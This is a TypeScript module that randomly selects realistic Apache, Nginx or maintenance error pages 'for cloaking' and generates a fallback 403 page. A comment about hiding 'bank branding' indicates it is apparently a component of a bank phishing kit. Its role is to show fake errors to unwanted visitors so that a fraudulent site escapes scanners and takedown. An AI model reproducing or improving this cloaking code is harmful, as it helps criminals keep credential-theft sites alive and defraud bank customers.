/**
 * Error Page Selector
 * Randomly selects realistic error pages for cloaking
 */

import path from 'path';
import fs from 'fs';

export interface ErrorPageOption {
  name: string;
  file: string;
  description: string;
  weight: number; // Higher weight = more likely to be selected
}

// Available error page options
const ERROR_PAGE_OPTIONS: ErrorPageOption[] = [
  {
    name: 'apache-403',
    file: 'apache-403.html',
    description: 'Standard Apache 403 Forbidden error',
    weight: 40 // Most common
  },
  {
    name: 'apache-404',
    file: 'apache-404.html', 
    description: 'Standard Apache 404 Not Found error',
    weight: 30
  },
  {
    name: 'nginx-403',
    file: 'nginx-403.html',
    description: 'Nginx 403 Forbidden error',
    weight: 20
  },
  {
    name: 'maintenance',
    file: 'maintenance.html',
    description: 'Site maintenance page',
    weight: 10 // Less common, but realistic
  }
];

/**
 * Select a random error page based on weights
 */
export function selectRandomErrorPage(): ErrorPageOption {
  // Calculate total weight
  const totalWeight = ERROR_PAGE_OPTIONS.reduce((sum, option) => sum + option.weight, 0);
  
  // Generate random number
  let random = Math.random() * totalWeight;
  
  // Select based on weight
  for (const option of ERROR_PAGE_OPTIONS) {
    random -= option.weight;
    if (random <= 0) {
      return option;
    }
  }
  
  // Fallback to first option
  return ERROR_PAGE_OPTIONS[0];
}

/**
 * Get the full path to an error page
 */
export function getErrorPagePath(filename: string): string {
  return path.join(__dirname, '../../../public/error-pages', filename);
}

/**
 * Check if error page file exists
 */
export function errorPageExists(filename: string): boolean {
  const filePath = getErrorPagePath(filename);
  return fs.existsSync(filePath);
}

/**
 * Get a random error page path that exists
 */
export function getRandomErrorPagePath(): string {
  const selectedPage = selectRandomErrorPage();
  const filePath = getErrorPagePath(selectedPage.file);
  
  // Check if file exists
  if (fs.existsSync(filePath)) {
    console.log(`📄 [CLOAK] Selected error page: ${selectedPage.name} (${selectedPage.description})`);
    return filePath;
  } else {
    console.warn(`⚠️ [CLOAK] Error page not found: ${selectedPage.file}, generating fallback`);
    // Return null - caller should generate HTML fallback instead of serving file
    return '';
  }
}

/**
 * Generate a simple HTML error page as fallback
 */
export function generateFallbackErrorPage(): string {
  return `
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>403 Forbidden</title>
    <!-- Blank favicon to prevent bank branding leaks -->
    <link rel="icon" type="image/x-icon" href="data:image/x-icon;base64,AAABAAEAEBAAAAEAIABoBAAAFgAAACgAAAAQAAAAIAAAAAEAIAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAA////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA==" />
    <link rel="shortcut icon" href="data:image/x-icon;base64,AAABAAEAEBAAAAEAIABoBAAAFgAAACgAAAAQAAAAIAAAAAEAIAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAA////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA==" />
    <style>
        body { font-family: Arial, sans-serif; margin: 50px; background: #f5f5f5; }
        .container { max-width: 600px; margin: 0 auto; background: white; padding: 40px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
        h1 { color: #d32f2f; margin: 0 0 20px 0; }
        p { color: #666; line-height: 1.6; }
        .code { color: #999; font-size: 12px; margin-top: 20px; }
    </style>
</head>
<body>
    <div class="container">
        <h1>403 - Forbidden</h1>
        <p>You don't have permission to access this resource.</p>
        <p>If you believe this is an error, please contact the site administrator.</p>
        <p class="code">Error Code: HTTP 403 Forbidden</p>
    </div>
</body>
</html>
  `.trim();
}
